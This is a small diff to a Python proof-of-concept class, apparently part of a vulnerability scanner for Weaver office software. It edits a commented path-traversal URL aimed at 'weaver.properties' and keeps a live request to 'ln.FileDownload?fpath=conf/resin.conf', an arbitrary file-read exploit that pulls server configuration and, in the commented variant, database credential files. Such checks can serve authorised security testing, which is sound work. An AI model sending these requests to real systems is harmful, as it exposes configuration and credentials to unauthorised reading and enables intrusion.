@@ -27,7 +27,7 @@ class POC(Script):
             ]))
             async with ClientSession() as session:
                 for path in path_list:
-                    # url = path + "weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties"
+                    # url = path + "weaver/ln.FileDownload?fpath=../weaver/WEB-INF/prop/weaver.properties"
                     url = path + "weaver/ln.FileDownload?fpath=conf/resin.conf"
 
                     async with session.get(url=url) as res:
